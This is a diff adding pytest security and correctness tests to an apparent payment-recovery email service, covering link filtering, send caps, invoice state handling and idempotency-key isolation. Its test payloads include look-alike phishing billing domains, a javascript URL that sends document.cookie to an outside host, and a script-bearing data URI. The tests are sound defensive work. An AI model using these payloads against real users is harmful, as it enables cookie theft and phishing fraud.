@@ -247,3 +247,138 @@ def test_a_dry_run_does_not_start_a_cooldown(isolated_store, monkeypatch):
     assert loop._cooldown_remaining(
         isolated_store, invoice_id="in_1", stripe_customer_id="cus_1"
     ) == 0.0
+
+
+# ---------------------------------------------------------------------------
+# Second audit round
+# ---------------------------------------------------------------------------
+
+@pytest.mark.parametrize("payload", [
+    "Update your card at paypilot-billing.tk/update",
+    "Go to //paypilot-billing.tk/update",
+    "javascript:fetch('//x.tk?c='+document.cookie)",
+    "data:text/html;base64,PHNjcmlwdD4=",
+    "billing.stripe.com.paypilot-billing.tk/update",
+    "Hi Acme (verify at acme-billing-secure.tk/pay), we tried...",
+])
+def test_links_without_a_scheme_are_still_caught(payload):
+    """Hardening _host_of was not enough: the URL EXTRACTION regex only matched
+    https:// and www., so a bare "evil.tk/update" in an invoice line
+    description was invisible to the allowlist and shipped in real copy. Mail
+    clients linkify it."""
+    from app.safety import message_violations
+
+    assert message_violations(payload, allow_hosts=False)
+
+
+def test_ordinary_copy_is_not_flagged_as_a_link():
+    """The broadened pattern must not suppress legitimate sends."""
+    from app import templates
+    from app.safety import find_foreign_urls
+
+    for code in ("card_expired", "insufficient_funds", "generic_decline"):
+        for kind in ("diagnosis", "message", "subject"):
+            text = templates.render(kind, code, name="Dana Fox", plan="Pro Plan")
+            assert find_foreign_urls(text) == [], f"{kind}/{code}"
+
+
+@pytest.mark.parametrize("value", ["inf", "1e400", "-inf", "nan"])
+def test_absurd_holdout_values_clamp_rather_than_crash(monkeypatch, value):
+    """float("inf") parses then explodes on int(). Escaping would 500 every
+    failed-payment event and stop all dunning."""
+    from app.attribution import holdout_pct
+
+    monkeypatch.setenv("PAYPILOT_HOLDOUT_PCT", value)
+    assert 0 <= holdout_pct() <= 100
+
+
+def test_an_already_paid_invoice_is_never_dunned(isolated_store, sending_on):
+    """Stripe can deliver a retry's payment_failed after the invoice was paid.
+    Emailing someone who has already paid is the worst message this sends."""
+    from app.store import STATE_RECOVERED
+
+    _record(isolated_store)
+    isolated_store.transition("in_1", STATE_RECOVERED, recovered_amount_minor=4900)
+
+    result = loop.deliver_recovery(invoice_id="in_1", recovery={"message": "hi"},
+                                   row=_row(), store=isolated_store)
+    assert result["status"] == "suppressed"
+    assert result["error"] == "invoice_already_recovered"
+    assert isolated_store.sent_message_count("in_1") == 0
+
+
+def test_churn_then_pay_is_acknowledged_not_a_500(isolated_store):
+    """A legal Stripe sequence. A 500 makes Stripe retry for days, then give up,
+    losing the recovery entirely."""
+    from app.store import STATE_CHURNED
+
+    _record(isolated_store)
+    isolated_store.transition("in_1", STATE_CHURNED, reason="test")
+
+    event = {"id": "evt_p", "type": "invoice.paid", "data": {"object": {
+        "object": "invoice", "id": "in_1", "customer": "cus_1",
+        "amount_paid": 4900, "currency": "eur"}}}
+    result = loop.handle_recovery(event, isolated_store)
+
+    assert result["handled"] is True, "must acknowledge, not raise"
+    assert result["reason"] == "illegal_transition"
+
+
+def test_a_bounce_does_not_hand_back_send_budget(isolated_store, sending_on):
+    """Counting only 'sent' let a bounce reset the cap, so a dead mailbox got
+    MORE mail than a live one."""
+    sending_on.setenv("PAYPILOT_MAX_TOUCHES", "1")
+    sending_on.setenv("PAYPILOT_SEND_COOLDOWN_HOURS", "0")
+    _record(isolated_store)
+
+    first = loop.deliver_recovery(invoice_id="in_1", recovery={"message": "hi"},
+                                  row=_row(), store=isolated_store)
+    assert first["status"] == mailer.STATUS_SENT
+    mailer.mark_bounced("rs_1", isolated_store)
+
+    second = loop.deliver_recovery(invoice_id="in_1", recovery={"message": "hi"},
+                                   row=_row(), store=isolated_store)
+    assert second["status"] == "suppressed"
+    assert second["error"] == "max_touches_reached"
+
+
+def test_cooldown_still_applies_without_a_stripe_customer_id(isolated_store, sending_on):
+    """The per-customer window silently vanished when Stripe's id was absent."""
+    sending_on.setenv("PAYPILOT_SEND_COOLDOWN_HOURS", "24")
+    for inv in ("in_a", "in_b"):
+        isolated_store.record_failure(
+            invoice_id=inv, customer_id="local_cus_1", amount_minor=1000,
+            currency="eur", failure_code="card_expired", stripe_customer_id=None,
+        )
+
+    row = {"customer_email": "me@mine.test", "failure_code": "card_expired",
+           "stripe_customer_id": None, "customer_id": "local_cus_1"}
+    a = loop.deliver_recovery(invoice_id="in_a", recovery={"message": "hi"},
+                              row=row, store=isolated_store)
+    b = loop.deliver_recovery(invoice_id="in_b", recovery={"message": "hi"},
+                              row=row, store=isolated_store)
+    assert a["status"] == mailer.STATUS_SENT
+    assert b["error"] == "cooldown_active"
+
+
+def test_idempotency_key_cannot_replay_another_clients_data(monkeypatch):
+    """The key is unauthenticated and caller-chosen. Keyed on its raw value, a
+    second caller got back the FIRST caller's customer name, plan and amount."""
+    from fastapi.testclient import TestClient
+
+    from app import api as api_module
+
+    monkeypatch.delenv("OPENAI_API_KEY", raising=False)
+    client = TestClient(api_module.app)
+    payload = {"customer_id": "cust_001", "amount": 1499.0, "currency": "usd",
+               "failure_code": "card_expired", "attempt": 1}
+    headers = {"Idempotency-Key": "guessable-key"}
+
+    victim = client.post("/payment-failed", json=payload,
+                         headers={**headers, "Fly-Client-IP": "203.0.113.1"})
+    attacker = client.post("/payment-failed",
+                           json={**payload, "customer_id": "cust_002", "amount": 1.0},
+                           headers={**headers, "Fly-Client-IP": "198.51.100.9"})
+
+    assert victim.status_code == 200 and attacker.status_code == 200
+    assert attacker.json()["impact"]["amount_at_risk"] != 1499.0
